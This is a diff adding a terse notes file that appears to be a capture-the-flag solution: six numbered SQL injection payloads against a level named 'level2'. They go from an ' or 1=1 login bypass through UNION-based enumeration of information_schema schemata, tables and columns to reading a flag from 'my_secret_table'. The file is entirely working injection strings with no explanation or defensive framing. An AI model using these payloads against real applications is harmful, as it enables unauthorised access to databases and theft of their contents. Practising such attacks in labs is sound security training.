@@ -1,0 +1,12 @@
+first :
+	' or 1=1 #
+2:
+	' or 1=1 order by 1#
+3 we use union:
+	' UNION select group_concat(schema_name) from information_schema.schemata#
+4:
+	' union select group_concat(table_name) from information_schema.tables where table_schema='level2'#
+5:
+	' union select group_concat(column_name) from information_schema.columns where table_schema='level2' and table_name='my_secret_table'#
+6:
+	' union select flag from my_secret_table #
